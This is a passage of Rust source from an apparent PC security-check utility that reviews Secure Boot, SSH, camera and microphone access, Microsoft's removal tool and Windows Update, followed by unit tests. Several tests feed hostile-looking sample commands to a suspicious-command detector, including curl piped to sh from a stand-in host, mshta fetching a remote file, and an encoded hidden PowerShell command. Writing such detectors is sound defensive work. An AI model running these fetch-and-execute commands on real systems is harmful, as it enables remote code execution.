            Some(false) => v.push(item("Secure Boot", "info", "Off. Some Linux setups need it off; turn it on in the PC's start-up (UEFI) settings if yours supports it.", "")),
            None => {}
        }
        if super::linux::ssh_server_active() {
            v.push(item("Remote login (SSH)", "warn", "On: other computers can log in to this one if they know a password. If you don't use it, turn the SSH service off.", ""));
        } else {
            v.push(item("Remote login (SSH)", "good", "Off: nobody can log in remotely.", ""));
        }
        if super::linux::reboot_required() {
            v.push(item("Restart needed", "warn", "Updates were installed that finish when you restart.", ""));
        }
    }
    v
}

#[cfg(windows)]
fn wmi_pref(name: &str) -> Option<f64> {
    super::win::wmi("ROOT\\Microsoft\\Windows\\Defender", &format!("SELECT {} FROM MSFT_MpPreference", name)).first().and_then(|r| super::win::v_f64(r, name))
}

/// App name from a camera/microphone record key ("C:#Program Files#Zoom#bin#Zoom.exe" or "Microsoft.WindowsCamera_8wekyb3d8bbwe").
pub fn consent_app_name(key: &str) -> String {
    if key.contains('#') {
        // A program path with '#' for '\\': the last part is the program's file name.
        return key.rsplit('#').find(|p| !p.is_empty()).unwrap_or(key).to_string();
    }
    key.split('_').next().unwrap_or(key).to_string()
}

/// Apps that used the camera or microphone in the last 30 days (Windows' own record), newest first.
fn privacy(cfg: &Config) -> Vec<Value> {
    #[cfg_attr(not(windows), allow(unused_mut))]
    let mut out = Vec::new();
    if cfg.test {
        return out;
    }
    #[cfg(windows)]
    {
        use super::win::{reg_open, HKEY_CURRENT_USER};
        for (what, cap, fix) in [("Camera", "webcam", "camera_privacy"), ("Microphone", "microphone", "mic_privacy")] {
            let base = format!("Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\{}", cap);
            let mut apps: Vec<(String, i64, bool, bool)> = Vec::new();
            let mut visit = |path: &str| {
                let Some(k) = reg_open(HKEY_CURRENT_USER, path) else { return };
                for sub in k.enum_keys().flatten() {
                    if sub == "NonPackaged" {
                        continue;
                    }
                    let Ok(sk) = k.open_subkey(&sub) else { continue };
                    let start = sk.get_value::<u64, _>("LastUsedTimeStart").unwrap_or(0) as i64;
                    let stop = sk.get_value::<u64, _>("LastUsedTimeStop").unwrap_or(1) as i64;
                    let Some(when) = util::from_filetime(start) else { continue };
                    if (util::now() - when).num_days() > 30 {
                        continue;
                    }
                    let lower = sub.to_lowercase();
                    let odd = lower.contains("#temp#") || lower.contains("#downloads#") || lower.contains("#users#public#");
                    apps.push((consent_app_name(&sub), start, stop == 0, odd));
                }
            };
            visit(&base);
            visit(&format!("{}\\NonPackaged", base));
            apps.sort_by(|a, b| b.1.cmp(&a.1));
            apps.dedup_by(|a, b| a.0.eq_ignore_ascii_case(&b.0));
            if apps.is_empty() {
                continue;
            }
            let odd = apps.iter().any(|a| a.3);
            let list: Vec<String> = apps
                .iter()
                .take(8)
                .map(|(n, t, now, _)| {
                    let when = if *now { " (using it now)".to_string() } else { util::from_filetime(*t).map(|w| format!(" ({})", util::nice_day(w))).unwrap_or_default() };
                    format!("{}{}", n, when)
                })
                .collect();
            out.push(json!({ "name": format!("{} used by", what), "level": if odd { "warn" } else { "info" }, "fix": fix,
                "detail": format!("{}{}", list.join(", "), if odd { ". One of these runs from a temporary or download folder: if you don't recognise it, turn its access off." } else { ". If one surprises you, turn its access off in Windows privacy settings." }) }));
        }
    }
    out
}

// ---------- Microsoft's Malicious Software Removal Tool (needs admin; runs through the admin helper) ----------
/// The result lines of MRT's own log (%windir%\debug\mrt.log), in plain words.
pub fn mrt_summary(log_text: &str) -> String {
    let tail = log_text.rsplit("Results Summary:").next().unwrap_or("");
    let lines: Vec<&str> = tail.lines().map(|l| l.trim()).filter(|l| !l.is_empty() && !l.starts_with("---") && !l.contains("Heartbeat")).take_while(|l| !l.contains("Finished On")).collect();
    if lines.iter().any(|l| l.contains("No infection found")) {
        return "No infection found.".into();
    }
    if lines.is_empty() {
        return "The tool finished; its log had no summary.".into();
    }
    format!("The tool reported: {}", lines.iter().take(4).cloned().collect::<Vec<_>>().join(" "))
}

pub fn mrt_job(eng: &Arc<Engine>, j: &Job) -> i32 {
    let cfg = &eng.cfg;
    j.step(1, 1, "running Microsoft's Malicious Software Removal Tool (a quick scan, usually 5-15 minutes)...");
    if cfg.test {
        j.say("Practice mode: the tool was not run.");
        return 0;
    }
    #[cfg(windows)]
    {
        let log = cfg.jobs_dir().join(format!("{}.mrt.log", j.id));
        if std::fs::write(&log, b"").is_err() {
            j.say("Could not prepare the progress file.");
            return 1;
        }
        let Ok(exe) = std::env::current_exe() else { return 1 };
        j.say("Windows will ask \"Do you want to allow this app to make changes?\" Click Yes to start the scan.");
        return match super::win::run_elevated(&exe, &format!("--mrt --log \"{}\"", log.display())) {
            Ok(proc) => super::deep::follow(j, &proc, &log),
            Err(1223) => {
                j.say("The scan did not start: Windows asked for permission and it was not given.");
                5
            }
            Err(e) => {
                j.say(format!("The scan did not start (Windows error {}).", e));
                1
            }
        };
    }
    #[allow(unreachable_code)]
    1
}

/// The admin side (`sweepwise --mrt --log <file>`).
pub fn mrt_helper(log: &std::path::Path) -> i32 {
    if !super::deep::safe_log(log) {
        return 2;
    }
    let say = |t: &str| {
        use std::io::Write;
        if let Ok(mut f) = std::fs::OpenOptions::new().append(true).open(log) {
            let _ = writeln!(f, "{}", t);
        }
    };
    let root = std::path::PathBuf::from(std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".into()));
    let mrt = root.join("System32").join("MRT.exe");
    let code = if !mrt.is_file() {
        say("Microsoft's Malicious Software Removal Tool is not on this PC yet (Windows Update installs it).");
        1
    } else {
        match util::command(&mrt.to_string_lossy()).arg("/Q").status() {
            Ok(_) => {
                let text = std::fs::read_to_string(root.join("debug").join("mrt.log")).or_else(|_| std::fs::read(root.join("debug").join("mrt.log")).map(|b| String::from_utf8_lossy(&b).replace('\0', ""))).unwrap_or_default();
                say(&mrt_summary(&text));
                0
            }
            Err(e) => {
                say(&format!("The tool did not start ({}).", e));
                1
            }
        }
    };
    say(&format!("##DONE exit={}", code));
    code
}

// ---------- 4. Windows Update ----------
fn updates(cfg: &Config) -> Value {
    if cfg.test {
        return json!({ "restart_pending": false, "last_update": Value::Null, "last_title": Value::Null, "days_since": Value::Null, "ok": true });
    }
    #[cfg(windows)]
    {
        use super::win::{reg_open, HKEY_LOCAL_MACHINE};
        let pending = reg_open(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\\RebootRequired").is_some()
            || reg_open(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\RebootPending").is_some();
        // Windows' own record of installed updates (event 19), skipping virus definitions and Store apps.
        let out = util::command("wevtutil.exe")
            .args(["qe", "System", "/q:*[System[Provider[@Name='Microsoft-Windows-WindowsUpdateClient'] and (EventID=19)]]", "/c:200", "/rd:true", "/f:text"])
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).replace('\0', ""))
            .unwrap_or_default();
        let skip = Regex::new(r"(?i)Security Intelligence Update|Definition Update|antimalware platform|^[0-9A-Z]{12}-").unwrap();
        let mut date: Option<String> = None;
        let mut last: Option<(chrono::DateTime<chrono::Local>, String)> = None;
        for line in out.lines() {
            let l = line.trim();
            if let Some(d) = l.strip_prefix("Date:") {
                date = Some(d.trim().to_string());
            } else if let Some(t) = l.split("installed the following update:").nth(1) {
                let title = t.trim().to_string();
                if skip.is_match(&title) {
                    continue;
                }
                if let Some(when) = date.as_ref().and_then(|d| chrono::DateTime::parse_from_rfc3339(d).ok()) {
                    last = Some((when.with_timezone(&chrono::Local), title));
                    break;
                }
            }
        }
        let days = last.as_ref().map(|(w, _)| (util::now() - *w).num_days());
        json!({
            "restart_pending": pending, "last_update": last.as_ref().map(|(w, _)| util::iso(*w)), "last_title": last.as_ref().map(|(_, t)| t.clone()),
            "days_since": days, "ok": !pending && days.map_or(false, |d| d <= 45),
        })
    }
    #[cfg(target_os = "linux")]
    {
        let pending = super::linux::pending_updates();
        let reboot = super::linux::reboot_required();
        let log = ["/var/log/apt/history.log", "/var/log/dnf.log", "/var/log/pacman.log"].iter().find_map(|f| std::fs::metadata(f).and_then(|m| m.modified()).ok());
        json!({
            "restart_pending": reboot, "last_update": log.map(|t| util::iso(util::to_local(t))), "last_title": Value::Null,
            "days_since": log.map(|t| util::days_since(t) as i64), "pending": pending, "ok": !reboot && pending.map_or(true, |n| n == 0),
        })
    }
    #[cfg(not(any(windows, target_os = "linux")))]
    json!({ "restart_pending": false, "last_update": Value::Null, "last_title": Value::Null, "days_since": Value::Null, "ok": true })
}

/// The security check job: writes security.json and a one-line summary.
/// The whole check at once, without saving it (`sweepwise --security-check`; read-only).
pub fn report(cfg: &Config) -> Value {
    json!({
        "checked": util::iso(util::now()), "protection": protection(cfg), "autoruns": autoruns(cfg), "extensions": extensions(cfg), "hijack": hijacks(cfg),
        "posture": posture(cfg), "privacy": privacy(cfg), "updates": updates(cfg),
    })
}

pub fn job(eng: &Arc<Engine>, j: &Job) -> i32 {
    let cfg = &eng.cfg;
    j.step(1, 4, "checking your virus protection, firewall and Windows' safety switches...");
    let prot = protection(cfg);
    let post = posture(cfg);
    let priv_ = privacy(cfg);
    j.step(2, 4, "checking programs that start with Windows and scheduled tasks...");
    let auto = autoruns(cfg);
    j.step(3, 4, "checking browser extensions and browser settings (search engine, proxy, hosts file)...");
    let ext = extensions(cfg);
    let hij = hijacks(cfg);
    j.step(4, 4, "checking Windows Update...");
    let upd = updates(cfg);
    let report = json!({ "checked": util::iso(util::now()), "protection": prot, "autoruns": auto, "extensions": ext, "hijack": hij, "posture": post, "privacy": priv_, "updates": upd });
    if let Err(e) = util::write_json(&cfg.data_dir.join("security.json"), &report) {
        j.say(format!("Could not save the report: {}", e));
        return 1;
    }
    let bad = prot.iter().filter(|p| p["ok"] == false).count();
    let check = ext.iter().filter(|e| e["level"] == "check").count();
    j.say(format!(
        "Protection: {}. Suspicious startup items or tasks: {}. Extensions to check: {}. Browser settings to check: {}. Windows Update: {}.",
        if bad > 0 { format!("{} problem(s)", bad) } else { "all good".into() },
        auto.len(),
        check,
        hij.iter().filter(|h| h["level"] == "check").count(),
        if upd["restart_pending"] == true { "restart needed" } else if upd["ok"] == true { "up to date" } else { "check it" }
    ));
    0
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn suspicious_commands_are_explained() {
        let mut sig = Sig(HashMap::new());
        let r = reasons("powershell.exe -w hidden -enc SQBFAFgA", "powershell.exe", &mut sig);
        assert!(r.iter().any(|x| x.contains("scrambled")));
        let r = reasons("mshta.exe http://bad.example/x.hta", "mshta.exe", &mut sig);
        assert!(r.iter().any(|x| x.contains("mshta")));
        let r = reasons("C:\\Users\\a\\AppData\\Local\\Temp\\x\\run.exe", "C:\\Users\\a\\AppData\\Local\\Temp\\x\\run.exe", &mut sig);
        assert!(r.iter().any(|x| x.contains("Temp folder")));
        if cfg!(windows) {
            assert!(r.iter().any(|x| x.contains("no longer exists")));
        }
        let ok = reasons("\"C:\\Windows\\System32\\SecurityHealthSystray.exe\"", "C:\\Windows\\System32\\SecurityHealthSystray.exe", &mut sig);
        assert!(ok.is_empty(), "{:?}", ok);
    }

    #[cfg(unix)]
    #[test]
    fn linux_start_up_commands_are_explained() {
        let mut sig = Sig(HashMap::new());
        let r = reasons("/tmp/.x/run.sh --quiet", "/tmp/.x/run.sh", &mut sig);
        assert!(r.iter().any(|x| x.contains("temporary folder")), "{:?}", r);
        assert!(r.iter().any(|x| x.contains("no longer exists")), "{:?}", r);
        let r = reasons("sh -c \"curl -fsSL http://bad.example/i | sh\"", "sh", &mut sig);
        assert!(r.iter().any(|x| x.contains("from the internet")), "{:?}", r);
        let r = reasons("bash -c \"echo aWQ= | base64 -d | bash\"", "bash", &mut sig);
        assert!(r.iter().any(|x| x.contains("scrambled")), "{:?}", r);
        let ok = reasons("/usr/bin/env true", "/usr/bin/env", &mut sig);
        assert!(ok.is_empty(), "{:?}", ok);
    }

    #[test]
    fn command_targets() {
        assert_eq!(command_target("\"C:\\Program Files\\A\\a.exe\" --x"), "C:\\Program Files\\A\\a.exe");
        assert_eq!(command_target("C:\\Tools\\b.exe /s"), "C:\\Tools\\b.exe");
        assert_eq!(command_target("rundll32.exe x.dll,Start"), "rundll32.exe");
    }

    #[test]
    fn extensions_are_judged_by_their_powers() {
        let root = std::env::temp_dir().join(format!("sw_sec_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let cfg = Config::for_test(&root);
        let data = super::super::clean::browsers(&cfg)[0].data.clone();
        let v = data.join("Default").join("Extensions").join("abcdefghijklmnop").join("1.0_0");
        std::fs::create_dir_all(v.join("_locales").join("en")).unwrap();
        std::fs::write(v.join("manifest.json"), r#"{"name":"__MSG_n__","version":"1.0","default_locale":"en","permissions":["proxy","management","cookies","<all_urls>"]}"#).unwrap();
        std::fs::write(v.join("_locales").join("en").join("messages.json"), r#"{"n":{"message":"Free VPN Helper"}}"#).unwrap();
        std::fs::write(data.join("Local State"), r#"{"profile":{"info_cache":{"Default":{"name":"Person 1"}}}}"#).unwrap();
        let list = extensions(&cfg);
        assert_eq!(list.len(), 1);
        assert_eq!(list[0]["name"], "Free VPN Helper");
        assert_eq!(list[0]["level"], "check");
        assert_eq!(list[0]["profile"], "Chrome · Person 1");
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn hosts_file_redirects_are_flagged_and_block_lists_only_noted() {
        let text = "\u{feff}# Default hosts file\n127.0.0.1 localhost\n52.41.116.211 geoip.example-vpn.co\n0.0.0.0 ads.example.com tracker.example.com\n";
        let f = hosts_findings(text);
        assert_eq!(f.len(), 2);
        assert_eq!(f[0]["level"], "check");
        assert!(f[0]["detail"].as_str().unwrap().contains("geoip.example-vpn.co to 52.41.116.211"));
        assert_eq!(f[1]["level"], "note");
        assert!(hosts_findings("# only comments\n127.0.0.1 localhost\n::1 localhost\n").is_empty());
        let linux = "127.0.0.1 localhost\n127.0.1.1 myhost.localdomain myhost\n::1 ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n";
        assert!(hosts_findings(linux).is_empty(), "{:?}", hosts_findings(linux));
    }

    #[test]
    fn proxies_and_proxy_scripts_are_explained() {
        assert_eq!(proxy_finding(false, "", "").map(|v| v["level"].clone()), None);
        assert_eq!(proxy_finding(true, "127.0.0.1:8888", "").unwrap()["level"], "note");
        assert_eq!(proxy_finding(true, "evil.example:80", "").unwrap()["level"], "check");
        assert_eq!(proxy_finding(false, "", "http://wpad.example/proxy.pac").unwrap()["level"], "check");
    }

    #[test]
    fn only_unknown_custom_search_engines_are_flagged() {
        let google = json!({ "default_search_provider_data": { "mirrored_template_url_data": { "prepopulate_id": 1, "url": "{google:baseURL}search?q={searchTerms}" } } });
        assert!(search_finding("Chrome", "Me", &google).is_none());
        let ddg = json!({ "default_search_provider_data": { "template_url_data": { "prepopulate_id": 0, "url": "https://duckduckgo.com/?q={searchTerms}" } } });
        assert!(search_finding("Chrome", "Me", &ddg).is_none());
        let bad = json!({ "default_search_provider_data": { "template_url_data": { "prepopulate_id": 0, "url": "https://search.shady-hijack.example/q?s={searchTerms}" } } });
        let f = search_finding("Edge", "Me", &bad).unwrap();
        assert!(f["detail"].as_str().unwrap().contains("search.shady-hijack.example"));
        assert!(search_finding("Chrome", "Me", &json!({})).is_none());
    }

    #[test]
    fn camera_and_microphone_records_give_app_names() {
        assert_eq!(consent_app_name("C:#Program Files#Zoom#bin#Zoom.exe"), "Zoom.exe");
        assert_eq!(consent_app_name("Microsoft.WindowsCamera_8wekyb3d8bbwe"), "Microsoft.WindowsCamera");
    }

    #[test]
    fn mrt_results_are_put_in_plain_words() {
        let clean = "Microsoft Windows Malicious Software Removal Tool v5.1\nResults Summary:\n----------------\nNo infection found.\nSuccessfully Submitted Heartbeat Report\nMicrosoft Windows Malicious Software Removal Tool Finished On Tue Oct 21\n";
        assert_eq!(mrt_summary(clean), "No infection found.");
        let found = "Results Summary:\n----------------\nFound Trojan:Win32/Example and Removed!\nMicrosoft Windows Malicious Software Removal Tool Finished On Tue\n";
        assert!(mrt_summary(found).contains("Trojan:Win32/Example"));
        assert!(mrt_summary("").contains("no summary"));
    }

    #[test]
    fn task_xml_is_read() {
        // The real list is only read on a real PC; here only the parser is checked.
        let sample = "<Tasks>\r\n<!-- \\Folder\\My Task -->\r\n<Task><Actions><Exec><Command>C:\\x\\a.exe</Command><Arguments>-q &amp; more</Arguments></Exec></Actions></Task>";
        let re = Regex::new(r"(?s)<Exec>.*?<Command>(.*?)</Command>(?:\s*<Arguments>(.*?)</Arguments>)?").unwrap();
        let c = re.captures(sample).unwrap();
        assert_eq!(xml_unescape(&c[2]), "-q & more");
    }
}
